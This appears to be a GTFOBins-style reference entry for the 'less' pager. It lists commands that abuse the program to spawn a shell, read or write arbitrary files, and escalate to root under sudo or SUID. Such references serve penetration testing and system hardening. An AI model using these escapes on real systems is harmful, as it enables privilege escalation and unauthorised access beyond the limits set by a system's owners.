---
functions:
  shell:
    - code: |
        less /etc/profile
        !/bin/sh
    - code: |
        VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
        v
  file-read:
    - code: less file_to_read
  file-write:
    - code: |
        echo DATA | less
        sfile_to_write
        q
  sudo:
    - code: |
        sudo less /etc/profile
        !/bin/sh
  suid:
    - code: ./less file_to_read
---
